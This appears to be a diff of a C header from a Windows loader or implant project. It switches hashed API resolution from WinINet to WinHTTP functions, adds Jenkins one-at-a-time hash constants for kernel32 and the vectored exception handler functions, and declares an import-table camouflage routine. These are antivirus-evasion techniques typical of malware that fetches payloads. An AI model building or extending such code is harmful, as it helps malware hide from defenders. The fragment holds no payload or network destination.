@@ -20,16 +20,17 @@ UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);
 #define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))
 
 typedef struct _API_HASHING {
-	fnGetTickCount64                pGetTickCount64;
-	fnInternetOpenA                 pInternetOpenA;
-	fnInternetConnectA              pInternetConnectA;
-	fnHttpOpenRequestA              pHttpOpenRequestA;
-	fnInternetSetOptionA            pInternetSetOptionA;
-	fnHttpSendRequestA               pHttpSendRequestA;
-	fnInternetReadFile              pInternetReadFile;
-	fnInternetCloseHandle           pInternetCloseHandle;
-	fnLoadLibraryA					pLoadLibraryA;
-} API_HASHING, * PAPI_HASHING;
+    fnGetTickCount64                pGetTickCount64;
+    fnWinHttpOpen                   pWinHttpOpen;
+    fnWinHttpConnect                pWinHttpConnect;
+    fnWinHttpOpenRequest            pWinHttpOpenRequest;
+    fnWinHttpSendRequest            pWinHttpSendRequest;
+    fnWinHttpReceiveResponse        pWinHttpReceiveResponse;
+    fnWinHttpReadData               pWinHttpReadData;
+    fnWinHttpCloseHandle            pWinHttpCloseHandle;
+    fnLoadLibraryA                  pLoadLibraryA;
+} API_HASHING, *PAPI_HASHING;
+
 
 typedef void*(NTAPI* fnAddVectoredExceptionHandler)(
         ULONG                       First,
@@ -61,6 +62,6 @@ VOID IatCamouflage();
 
 //dllmain.c
 
-#define kernel32dll_CRC32 0x00
-#define AddVectoredExceptionHandler_CRC32 0x00
-#define RemoveVectoredExceptionHandler_CRC32 0x00
+#define kernel32dll_JOAA                     0x20666D0D
+#define AddVectoredExceptionHandler_JOAA     0x1E73D3C6
+#define RemoveVectoredExceptionHandler_JOAA  0xE35AA59E
